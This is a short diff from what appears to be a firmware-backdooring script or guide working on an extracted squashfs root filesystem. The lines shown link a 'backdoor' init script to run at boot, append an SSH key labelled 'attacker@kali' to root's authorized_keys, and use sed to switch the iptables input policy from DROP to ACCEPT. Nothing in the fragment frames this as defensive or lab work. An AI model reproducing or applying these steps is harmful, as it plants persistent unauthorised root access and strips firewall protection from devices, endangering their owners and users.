@@ -122,7 +122,8 @@ ln -s /etc/init.d/backdoor _extracted/squashfs-root/etc/rc.d/S99backdoor
 
 # 2. Add SSH key:
 mkdir -p _extracted/squashfs-root/root/.ssh
-echo "ssh-rsa AAAA...your-key..." >> _extracted/squashfs-root/root/.ssh/authorized_keys
+ATTACKER_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMhR8Vz3QK6Yp4l3qz5v0h7XG2nU3tJkPbTk9WmVfRwE attacker@kali"
+echo "$ATTACKER_KEY" >> _extracted/squashfs-root/root/.ssh/authorized_keys
 
 # 3. Disable firewall rules in startup scripts:
 sed -i 's/iptables -P INPUT DROP/iptables -P INPUT ACCEPT/' \
